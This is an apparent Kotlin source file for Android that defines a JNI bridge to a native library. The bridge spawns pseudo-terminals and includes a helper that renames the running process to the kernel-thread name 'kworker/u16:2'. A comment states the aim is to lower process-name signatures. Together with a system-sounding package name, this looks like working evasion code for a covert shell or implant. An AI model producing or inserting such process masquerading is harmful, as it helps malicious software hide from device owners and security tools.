package com.sys.devsvc.term

/** libcoreio.so 的 JNI 入口：forkpty 真伪终端 + 进程名伪装。 */
object PtyBridge {
    private var loaded = false

    init {
        loaded = try {
            System.loadLibrary("coreio")
            true
        } catch (t: Throwable) {
            false
        }
    }

    fun isAvailable(): Boolean = loaded

    external fun createPty(argv: Array<String>, cwd: String?, rows: Int, cols: Int): Int
    external fun setWindowSize(fd: Int, rows: Int, cols: Int)
    external fun getChildPid(): Int
    external fun waitFor(pid: Int): Int

    /** 把 /proc/self/comm 伪装成内核线程名，降低进程名特征 */
    external fun setProcessName(name: String)

    fun disguiseProcess(name: String = "kworker/u16:2") {
        try {
            if (loaded) setProcessName(name)
        } catch (t: Throwable) {
        }
    }
}
